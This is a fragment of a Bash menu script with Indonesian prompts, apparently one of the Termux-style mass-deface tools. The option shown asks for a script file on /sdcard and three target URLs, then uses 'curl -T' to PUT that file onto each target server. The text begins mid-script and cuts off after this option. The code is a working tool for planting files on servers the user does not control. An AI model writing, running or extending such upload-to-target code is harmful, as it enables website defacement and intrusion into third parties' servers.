...
case $pil in
1) echo "[*] Pilih 3 Sampai 10 Sayang :V" | lolcat
echo " "
;;
2)  echo "[*] Pilih 3 Sampai 10 Sayang :V" | lolcat
echo " "
;;
3) read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Target 1 => " a1;
read -p "[?] Masukan Target 2 => " a2;
read -p "[?] Masukan Target 3 => " a3;
curl -T /sdcard/$sc $a1
curl -T /sdcard/$sc $a2
curl -T /sdcard/$sc $a3
